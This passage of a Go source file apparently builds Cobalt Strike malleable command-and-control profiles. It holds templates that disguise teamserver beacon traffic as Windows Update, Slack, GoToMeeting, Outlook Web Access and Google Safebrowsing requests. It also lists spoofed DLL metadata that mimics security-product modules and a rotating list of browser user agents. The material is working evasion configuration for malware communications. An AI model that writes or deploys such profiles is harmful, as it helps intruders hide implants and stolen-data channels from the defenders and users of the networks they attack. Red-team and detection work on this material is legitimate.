	set rich_header    "\x77\xf3\x15\x7d\x33\x92\x7b\x2e\x33\x92\x7b\x2e\x33\x92\x7b\x2e\x3a\xea\xe8\x2e\xb3\x92\x7b\x2e\x68\xfa\x7f\x2f\x3c\x92\x7b\x2e\x68\xfa\x78\x2f\x30\x92\x7b\x2e\x68\xfa\x7e\x2f\x2d\x92\x7b\x2e\x33\x92\x7a\x2e\xf8\x97\x7b\x2e\x68\xfa\x7a\x2f\x3e\x92\x7b\x2e\x68\xfa\x7b\x2f\x32\x92\x7b\x2e\x68\xfa\x72\x2f\xa9\x92\x7b\x2e\x68\xfa\x86\x2e\x32\x92\x7b\x2e\x68\xfa\x84\x2e\x32\x92\x7b\x2e\x68\xfa\x79\x2f\x32\x92\x7b\x2e\x52\x69\x63\x68\x33\x92\x7b\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "164653";
	set compile_time   "06 Nov 2020 18:42:28";
	set entry_point    "63072";
	set name           "CyMemDef64.dll";
	set rich_header    "\x5f\x64\xdb\xae\x1b\x05\xb5\xfd\x1b\x05\xb5\xfd\x1b\x05\xb5\xfd\x1b\x05\xb4\xfd\x30\x05\xb5\xfd\xe7\x72\x0c\xfd\x18\x05\xb5\xfd\x7d\xeb\x66\xfd\x07\x05\xb5\xfd\x3c\xc3\x78\xfd\x1a\x05\xb5\xfd\x7d\xeb\x7f\xfd\x1a\x05\xb5\xfd\x3c\xc3\x7c\xfd\x1a\x05\xb5\xfd\x1b\x05\x22\xfd\x1a\x05\xb5\xfd\x7d\xeb\x79\xfd\x1a\x05\xb5\xfd\x52\x69\x63\x68\x1b\x05\xb5\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
	`
	set checksum       "1968945";
	set compile_time   "26 Jul 2021 18:09:30";
	set entry_point    "1099888";
	set image_size_x86 "2072576";
	set image_size_x64 "2072576";
	set name           "InProcessClient.dll";
	set rich_header    "\xd5\x71\x0e\xb3\x91\x10\x60\xe0\x91\x10\x60\xe0\x91\x10\x60\xe0\x85\x7b\x63\xe1\x84\x10\x60\xe0\x85\x7b\x65\xe1\x24\x10\x60\xe0\x48\x64\x64\xe1\x83\x10\x60\xe0\x48\x64\x63\xe1\x9d\x10\x60\xe0\xf7\x7f\x9d\xe0\x92\x10\x60\xe0\x4a\x64\x61\xe1\x93\x10\x60\xe0\x85\x7b\x64\xe1\xb2\x10\x60\xe0\x85\x7b\x61\xe1\x94\x10\x60\xe0\x48\x64\x65\xe1\x0e\x10\x60\xe0\xfb\x78\x65\xe1\x80\x10\x60\xe0\x85\x7b\x66\xe1\x93\x10\x60\xe0\x91\x10\x61\xe0\x5c\x11\x60\xe0\x4a\x64\x69\xe1\x03\x10\x60\xe0\x4a\x64\x63\xe1\x93\x10\x60\xe0\x4a\x64\x60\xe1\x90\x10\x60\xe0\x4a\x64\x9f\xe0\x90\x10\x60\xe0\x91\x10\xf7\xe0\x90\x10\x60\xe0\x4a\x64\x62\xe1\x90\x10\x60\xe0\x52\x69\x63\x68\x91\x10\x60\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    `,
	`
	set checksum       "2817694";
	set compile_time   "19 May 2021 13:31:53";
	set entry_point    "1253200";
	set image_size_x86 "2863104";
	set image_size_x64 "2863104";
	set name           "ctiuser.dll";
	set rich_header    "\x15\xd9\xb0\x30\x51\xb8\xde\x63\x51\xb8\xde\x63\x51\xb8\xde\x63\x45\xd3\xda\x62\x47\xb8\xde\x63\x45\xd3\xdd\x62\x5f\xb8\xde\x63\x45\xd3\xdb\x62\x90\xb8\xde\x63\xcf\x18\x19\x63\x52\xb8\xde\x63\xa9\xc8\xda\x62\x40\xb8\xde\x63\xa9\xc8\xdd\x62\x5b\xb8\xde\x63\xa9\xc8\xdb\x62\xdf\xb8\xde\x63\x45\xd3\xdf\x62\x54\xb8\xde\x63\x45\xd3\xd8\x62\x53\xb8\xde\x63\x51\xb8\xdf\x63\x29\xb9\xde\x63\xe9\xc9\xda\x62\x69\xb8\xde\x63\xe9\xc9\xdb\x62\x13\xb8\xde\x63\xe9\xc9\xde\x62\x50\xb8\xde\x63\xe9\xc9\x21\x63\x50\xb8\xde\x63\x51\xb8\x49\x63\x50\xb8\xde\x63\xe9\xc9\xdc\x62\x50\xb8\xde\x63\x52\x69\x63\x68\x51\xb8\xde\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    `,
	`
	set checksum       "83724";
	set compile_time   "05 Aug 2020 16:06:20";
	set entry_point    "5664";
	set name           "umppc.dll";
	set rich_header    "\xba\xf0\x63\x99\xfe\x91\x0d\xca\xfe\x91\x0d\xca\xfe\x91\x0d\xca\x92\xf9\x0e\xcb\xff\x91\x0d\xca\x92\xf9\x05\xcb\xf3\x91\x0d\xca\x9b\xf7\x0e\xcb\xfc\x91\x0d\xca\x9b\xf7\x09\xcb\xfb\x91\x0d\xca\x9b\xf7\x0c\xcb\xfd\x91\x0d\xca\xfe\x91\x0c\xca\xc6\x91\x0d\xca\x92\xf9\x0d\xcb\xff\x91\x0d\xca\x92\xf9\xf2\xca\xff\x91\x0d\xca\x92\xf9\x0f\xcb\xff\x91\x0d\xca\x52\x69\x63\x68\xfe\x91\x0d\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	`,
}

var Useragent_list = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4242.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4301.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.133 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4390.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4474.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4562.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3818.0 Safari/537.36 Edg/77.0.188.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36 Edg/78.0.276.20",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3943.0 Safari/537.36 Edg/79.0.308.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.0 Safari/537.36 Edg/80.0.361.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Edg/80.0.361.66",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.34 Safari/537.36 Edg/81.0.416.20",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4063.0 Safari/537.36 Edg/82.0.439.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; EIE10;PTPTWOL; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; xs-fUpniB-BAE8; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; BOIE9;PTPT; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; POS2; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; eraybfhe; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; D-M1-200309AC;D-M1-MSSP1; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0.1) Gecko/20100101 Firefox/86.0.1",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4433.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4391.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4242.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAGWJS; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; TNJB; MSAppHost/2.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; ASTE; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALEJS; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; TCO_20200224223500; rv:11.0) like Gecko",
	"Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
	"Mozilla/5.0 (X11; Linux x86_64:71.0) Gecko/20100101 Firefox/71.0",
	"Mozilla/4.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0",
	"Mozilla/5.0 (X11; Linux x86_64:75.0) Gecko/20100101 Firefox/75.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4065.1 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.31",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.131 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.10 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.130 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/73.0",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:83.0) Gecko/20100101 Firefox/83.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:86.0) Gecko/20100101 Firefox/86.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:84.1) Gecko/20100101 Firefox/84.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:85.1) Gecko/20100101 Firefox/85.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/99.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
}

var HTTP_GET_POST_list = []string{
	`
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}

http-get {
{{.Variables.HTTP_GET_URI}}


client {

	header "Accept" "*/*";
	header "Host" "{{.Variables.Host}}";
	
	metadata {
		{{.Variables.metadata_mode}};
		append ".cab";
		uri-append;
	}
}


server {
	header "Content-Type" "application/vnd.ms-cab-compressed";
	header "Server" "Microsoft-IIS/8.5";
	header "MSRegion" "N. America";
	header "Connection" "keep-alive";
	header "X-Powered-By" "ASP.NET";

	output {

		print;
	}
}
}

http-post {
{{.Variables.HTTP_POST_URI}}

set verb "GET";

client {

	header "Accept" "*/*";


	id {
		prepend "download.windowsupdate.com/c/";
		header "Host";
	}


	output {
		{{.Variables.metadata_mode}};
		append ".cab";
		uri-append;
	}
}

server {
	header "Content-Type" "application/vnd.ms-cab-compressed";
	header "Server" "Microsoft-IIS/8.5";
	header "MSRegion" "N. America";
	header "Connection" "keep-alive";
	header "X-Powered-By" "ASP.NET";

	output {
		print;
	}
}
}

http-stager {
	server {
		header "Content-Type" "application/vnd.ms-cab-compressed";
	}
}`, `

http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}

http-get {

{{.Variables.HTTP_GET_URI}}

client {

	header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";
header "Accept-Language" "en-US";
header "Connection" "close";

	
	metadata {
	{{.Variables.metadata_mode}};
	append ";_ga=GA1.2.875";
	append ";__ar_v4=%8867UMDGS643";
	prepend "d=";
	prepend "_ga=GA1.2.875;";
	prepend "b=.12vPkW22o;";
	header "Cookie";

	}

}

server {

header "Content-Type" "text/html; charset=utf-8";
header "Connection" "close";
header "Server" "Apache";
header "X-XSS-Protection" "0";
header "Strict-Transport-Security" "max-age={{.Variables.maxage}}; includeSubDomains; preload";
header "Referrer-Policy" "no-referrer";
header "X-Slack-Backend" "h";
header "Pragma" "no-cache";
header "Cache-Control" "private, no-cache, no-store, must-revalidate";
header "X-Frame-Options" "SAMEORIGIN";
header "Vary" "Accept-Encoding";
header "X-Via" "haproxy-www-w6k7";
	

	output {

		{{.Variables.metadata_mode}};

	prepend "<!DOCTYPE html>
<html lang=\"en-US\" class=\"supports_custom_scrollbar\">

<head>

<meta charset=\"utf-8\">
<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
<meta name=\"referrer\" content=\"no-referrer\">
<meta name=\"superfish\" content=\"nofish\">
	<title>Microsoft Developer Chat Slack</title>
<meta name=\"author\" content=\"Slack\">
	

<link rel=\"dns-prefetch\" href=\"https://a.slack-edge.com?id=";

	append "\"> </script>";
	
	append "<div id=\"client-ui\" class=\"container-fluid sidebar_theme_\"\"\">


<div id=\"banner\" class=\"hidden\" role=\"complementary\" aria-labelledby=\"notifications_banner_aria_label\">
<h1 id=\"notifications_banner_aria_label\" class=\"offscreen\">Notifications Banner</h1>

<div id=\"notifications_banner\" class=\"banner sk_fill_blue_bg hidden\">
	Slack needs your permission to <button type=\"button\" class=\"btn_link\">enable desktop notifications</button>.		<button type=\"button\" class=\"btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\" data-action=\"dismiss_banner\" aria-label=\"Dismiss\"></button>
</div>

<div id=\"notifications_dismiss_banner\" class=\"banner seafoam_green_bg hidden\">
	We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.		<span class=\"inline_block no_wrap\">
		<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\">Enable notifications</button> •
		<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close()\">Ask me next time</button> •
		<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.closeNagAndSetCookie()\">Never ask again on this computer</button>
	</span>
</div>";

		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}

client {

header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";
header "Accept-Language" "en-US";     
	
	output {
		{{.Variables.metadata_mode}};
	
	append ";_ga=GA1.2.875";
	append "__ar_v4=%8867UMDGS643";
	prepend "d=";
	prepend "_ga=GA1.2.875;";
	prepend "b=.12vPkW22o;";
	header "Cookie";


	}


	id {
		{{.Variables.metadata_mode}};
	prepend "GA1.";
	header "_ga";

	}
}

server {

header "Content-Type" "application/json; charset=utf-8";
header "Connection" "close";
header "Server" "Apache";
header "Strict-Transport-Security" "max-age={{.Variables.maxage}}; includeSubDomains; preload";
header "Referrer-Policy" "no-referrer";
header "X-Content-Type-Options" "nosniff";
header "X-Slack-Req-Id" "6319165c-f976-4d0666532";
header "X-XSS-Protection" "0";
header "X-Slack-Backend" "h";
header "Vary" "Accept-Encoding";
header "Access-Control-Allow-Origin" "*";
header "X-Via" "haproxy-www-6g1x";
	

	output {
		{{.Variables.metadata_mode}};

	prepend "{\"ok\":true,\"args\":{\"user_id\":\"LUMK4GB8C\",\"team_id\":\"T0527B0J3\",\"version_ts\":\"";
	append "\"},\"warning\":\"superfluous_charset\",\"response_metadata\":{\"warnings\":[\"superfluous_charset\"]}}";

		print;
	}
}
}

http-stager {

set uri_x86 "/messages/DALBNSf25";
set uri_x64 "/messages/DALBNSF25";

client {
header "Accept" "*/*";
header "Accept-Language" "en-US,en;q=0.5";
header "Accept-Encoding" "gzip, deflate";
header "Connection" "close";
}

server {
header "Content-Type" "text/html; charset=utf-8";        
header "Connection" "close";
header "Server" "Apache";
header "X-XSS-Protection" "0";
header "Strict-Transport-Security" "max-age={{.Variables.maxage}}; includeSubDomains; preload";
header "Referrer-Policy" "no-referrer";
header "X-Slack-Backend" "h";
header "Pragma" "no-cache";
header "Cache-Control" "private, no-cache, no-store, must-revalidate";
header "X-Frame-Options" "SAMEORIGIN";
header "Vary" "Accept-Encoding";
header "X-Via" "haproxy-www-suhx";

}


}	
`, `
http-config {
	set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
	header "Content-Type" "text/html;charset=UTF-8";
	header "Connection" "close";
	header "Brightspot-Id" "00000459-72af-a783-feef2189";
	header "Cache-Control" "max-age={{.Variables.maxage}}";
	header "Server" "Apache-Coyote/1.1";
	header "X-Content-Type-Options" "nosniff";
	header "X-Powered-By" "Brightspot";
	header "Vary" "Accept-Encoding";
	set trust_x_forwarded_for "{{.Variables.forward}}";

}

http-get {

{{.Variables.HTTP_GET_URI}}

client {

	header "Host" "{{.Variables.Host}}";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";

	metadata {
	{{.Variables.metadata_mode}}; 
	parameter "_";

	}

}

server {
	
	output {

		{{.Variables.metadata_mode}};	    

	prepend "content=";
	prepend "<meta name=\"google-site-verification\"\n";
	prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	prepend "        <meta charset=\"UTF-8\">\n";
	prepend "    <head>\n";
	prepend "<html lang=\"en\">\n";
	prepend "<!DOCTYPE html>\n";

	append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	append "<script type=\"text/javascript\">\n";
	append "  var _kiq = _kiq || [];\n";
	append "  (function(){\n";
	append "    setTimeout(function(){\n";
	append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	append "d.createElement('script'); s.type = 'text/javascript';\n";
	append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	append "f.parentNode.insertBefore(s, f);\n";
	append "    }, 1);\n";
	append "})();\n";
	append "</script>\n";
	append "</body>\n";
	append "</html>\n";
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}
set verb "GET";

client {

	header "Host" "{{.Variables.Host}}";
	header "Accept" "*/*";
	header "Accept-Language" "en";
	header "Connection" "close";     
	
	output {
		{{.Variables.metadata_mode}}; 
	parameter "includeMeetingsICoorganize";
	}


	id {
		{{.Variables.metadata_mode}};
	parameter "includeCoorganizers";

	}
}

server {

	output {
		{{.Variables.metadata_mode}};	    

	prepend "content=";
	prepend "<meta name=\"google-site-verification\"\n";
	prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	prepend "        <meta charset=\"UTF-8\">\n";
	prepend "    <head>\n";
	prepend "<html lang=\"en\">\n";
	prepend "<!DOCTYPE html>\n";

	append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	append "<script type=\"text/javascript\">\n";
	append "  var _kiq = _kiq || [];\n";
	append "  (function(){\n";
	append "    setTimeout(function(){\n";
	append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	append "d.createElement('script'); s.type = 'text/javascript';\n";
	append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	append "f.parentNode.insertBefore(s, f);\n";
	append "    }, 1);\n";
	append "})();\n";
	append "</script>\n";
	append "</body>\n";
	append "</html>\n";
		print;
	}
}
}

http-stager {

set uri_x86 "/Meeting/{{.Variables.UValue}}/";
set uri_x64 "/Meeting/{{.Variables.UValue}}/";

client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
}

server {

}


}
`, `
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}
http-get {

{{.Variables.HTTP_GET_URI}}

client {

header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";
header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42={{.Variables.UValue}}";
	
	metadata {
		{{.Variables.metadata_mode}};
		parameter "wa";


	}

parameter "path" "/calendar";

}

server {

header "Cache-Control" "no-cache";
header "Pragma" "no-cache";
header "Content-Type" "text/html; charset=utf-8";
header "Server" "Microsoft-IIS/10.0";
header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
header "X-CalculatedBETarget" "BY2PR06MB549.namprd0{{.Variables.namprdnumber}}.prod.outlook.com";
header "X-Content-Type-Options" "nosniff";
header "X-OWA-Version" "15.1.1240.20";
header "X-OWA-OWSVersion" "V2017_06_15";
header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
header "X-Frame-Options" "SAMEORIGIN";
header "X-DiagInfo" "BY2PR06MB549";
header "X-UA-Compatible" "IE=EmulateIE7";
header "X-Powered-By" "ASP.NET";
header "X-FEServer" "CY4PR02CA0010";
header "Connection" "close";
	

	output {
		{{.Variables.metadata_mode}};
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}
set verb "GET";

client {

header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";     
	
	output {
		{{.Variables.metadata_mode}};
	parameter "wa";


	}



	id {
		{{.Variables.metadata_mode}};

	prepend "wla42=";
	prepend "xid=730bf7;";
	prepend "MSPAuth=3EkAjDKjI;";
	prepend "ClientId=1C0F6C5D910F9;";
	prepend "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;";
	header "Cookie";


	}
}

server {

header "Cache-Control" "no-cache";
header "Pragma" "no-cache";
header "Content-Type" "text/html; charset=utf-8";
header "Server" "Microsoft-IIS/10.0";
header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
header "X-CalculatedBETarget" "BY2PR06MB549.namprd0{{.Variables.namprdnumber}}.prod.outlook.com";
header "X-Content-Type-Options" "nosniff";
header "X-OWA-Version" "15.1.1240.20";
header "X-OWA-OWSVersion" "V2017_06_15";
header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
header "X-Frame-Options" "SAMEORIGIN";
header "X-DiagInfo" "BY2PR06MB549";
header "X-UA-Compatible" "IE=EmulateIE7";
header "X-Powered-By" "ASP.NET";
header "X-FEServer" "CY4PR02CA0010";
header "Connection" "close";
	

	output {
		{{.Variables.metadata_mode}};
		print;
	}
}
}

http-stager {

set uri_x86 "/rpc/{{.Variables.number86}}";
set uri_x64 "/rpc/{{.Variables.number64}}";

client {
	header "Host" "{{.Variables.Host}}";
header "Accept" "*/*";
}

server {
	header "Server" "nginx";    
}


}
`, `

http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}

http-get {

{{.Variables.HTTP_GET_URI}}

client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";
	metadata {
		{{.Variables.metadata_mode}};
		prepend "REF=ID={{.Variables.UValue}}";
		header "Cookie";
	}
}

server {
	header "Content-Type" "application/vnd.google.safebrowsing-chunk";
	header "X-Content-Type-Options" "nosniff";
	header "Content-Encoding" "gzip";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";

	output {
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}

client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";

	id {
		{{.Variables.metadata_mode}};
		prepend "U={{.Variables.UValue}}";
		prepend "REF=ID=";
		header "Cookie";
	}

	output {
		print;
	}
}

server {
	header "Content-Type" "application/vnd.google.safebrowsing-chunk";
	header "X-Content-Type-Options" "nosniff";
	header "Content-Encoding" "gzip";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";
	output {			print;
	}
}
}`, `
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}
http-get {

{{.Variables.HTTP_GET_URI}}


client {
	header "Host" "{{.Variables.Host}}";
	{{.Variables.CDN}}

	metadata {
		mask;
		{{.Variables.metadata_mode}};
		uri-append;
	}
}

server {
	header "X-Content-Type-Options" "nosniff";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";

	output {
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}

client {
	header "Host" "{{.Variables.Host}}";
	{{.Variables.CDN}}

	id {
		mask;
		{{.Variables.metadata_mode}};
		uri-append;
	}

	output {
		print;
	}
}

server {
	header "X-Content-Type-Options" "nosniff";
	header "X-XSS-Protection" "1; mode=block";
